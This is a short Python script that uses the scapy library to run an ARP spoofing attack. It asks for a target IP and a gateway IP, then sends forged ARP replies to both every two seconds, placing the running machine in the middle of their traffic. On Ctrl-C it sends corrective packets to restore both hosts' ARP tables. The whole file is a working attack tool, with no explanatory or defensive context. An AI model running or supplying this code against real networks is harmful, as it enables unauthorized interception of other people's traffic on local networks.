from scapy.all import * # type: ignore
import time
import sys

def get_mac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].src
    return None

def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

def main():
    target_ip = input("target ip: ")
    gateway_ip = input("gateway ip: ")

    try:
        print(f"trying to send bad packtes to both devices")
        while True:
            spoof(target_ip, gateway_ip)
    
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("sent good packet")

main()